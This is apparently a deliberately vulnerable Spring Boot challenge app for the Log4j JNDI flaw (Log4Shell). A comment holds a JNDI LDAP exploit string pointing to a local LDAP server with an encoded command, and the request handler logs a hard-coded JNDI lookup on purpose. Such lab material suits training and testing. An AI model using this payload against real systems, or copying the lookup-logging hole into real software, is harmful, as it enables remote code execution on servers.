package uk.co.lnwatson.challenges.log4j;

import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

// ${jndi:ldap://127.0.0.1:1389/Basic/Command/Base64/c3RhcnQgLg==}

@SpringBootApplication
public class Log4jApplication {

	public static void main(String[] args) {

		SpringApplication.run(Log4jApplication.class, args);

	}

	@RestController
	@RequestMapping("/")
	public static class HomeController {

		private static final Logger logger = LogManager.getLogger("UserLogs");

		@GetMapping("/{id}")
		public String index(@PathVariable String id) {
			id = "${jndi:ldap://127.0.0.1:1389}";
			logger.info("Info! - " + id);
			return "Ahh";
		}


	}




}
